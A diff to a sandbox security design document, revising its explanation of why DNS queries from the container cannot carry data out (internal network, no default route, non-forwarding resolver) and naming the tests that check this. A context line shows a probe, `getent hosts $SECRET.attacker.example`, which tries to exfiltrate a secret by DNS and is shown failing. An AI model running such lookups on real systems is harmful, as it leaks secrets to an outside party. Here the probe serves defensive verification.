@@ -1116,9 +1116,27 @@ requires a concrete credentialed-operation requirement before adding that mechan
 
 ### DNS
 
-The sandbox runs with `--dns=none` and a single `--add-host` entry for the proxy. When configured to
-use the proxy for HTTPS, curl, npm and uv send `CONNECT host:443`; the proxy resolves the
-destination, so those requests require no DNS lookup inside the sandbox.
+No DNS query from the sandbox container reaches a server outside the run, so DNS carries no data
+out. Clients configured to use the proxy send `CONNECT host:443`, and the proxy looks up the
+destination only after the ruleset allows it (the connection checks above), so those requests need
+no lookup inside the sandbox. No other place the container can look a name up passes it on:
+
+- **The public resolvers in the image's `resolv.conf`** are unreachable. `--dns=none` means podman
+  writes no `resolv.conf`, so the container keeps the image's own.
+  - The sandbox's network is `--internal`: its routing table holds one on-link entry and no
+    default route, so a packet to a nameserver outside it has nowhere to go and the lookup fails
+    at once rather than travelling anywhere.
+- **The network's own resolver**, aardvark-dns at the network's first address, answers the run's
+  container names and `NXDOMAIN` for every other name, forwarding none.
+  - podman documents this for
+    [`--internal`](https://docs.podman.io/en/latest/markdown/podman-network-create.1.html#internal)
+    networks. aardvark-dns forwards no query from a container attached only to internal networks
+    (`ctr_is_internal` in
+    [`src/dns/coredns.rs`](https://github.com/containers/aardvark-dns/blob/main/src/dns/coredns.rs)).
+- **`/etc/hosts`** holds the one name that must work: `--add-host` puts `egress-proxy` there.
+
+**Routing and the `--internal` network enforce this, not the resolver configuration:** `--dns=none`
+puts no resolver out of reach. Unsetting the proxy variables does not create a route.
 
 What a session is left with, measured from inside one:
 
@@ -1127,15 +1145,13 @@ What a session is left with, measured from inside one:
     $ getent hosts $SECRET.attacker.example
     (no answer, 2 ms)
 
-**Routing is what enforces this, not the resolver configuration.** `--dns=none` means podman writes
-no `resolv.conf`, so the container keeps the image's own — which still names public resolvers. They
-are unreachable: the sandbox's network is `--internal`, its routing table holds one on-link entry
-and no default route, so a packet to a nameserver outside it has nowhere to go and the lookup fails
-at once rather than travelling anywhere. The one name that must work needs no resolver at all,
-because `--add-host` put it in `/etc/hosts`.
+`SessionBoundaryTest` checks failed direct network access, failed external name resolution, the
+absent default route underlying both, and which names the network's resolver answers.
 
-Unsetting the proxy variables does not create a route. `SessionBoundaryTest` checks failed direct
-network access, failed external name resolution, and the absent default route underlying both.
+A run-on-host command's own lookup of an internet name fails too, although its profile grants the
+Mach service the system's resolver library asks (`SeatbeltProfile.MachServices`): under the sbt
+profile, `InetAddress.getAllByName("example.com")` answers `nodename nor servname provided`
+(2026-09-29). The acceptance test's row "DNS resolution (the system's resolver) fails" checks it.
 
 ## Clipboard
 
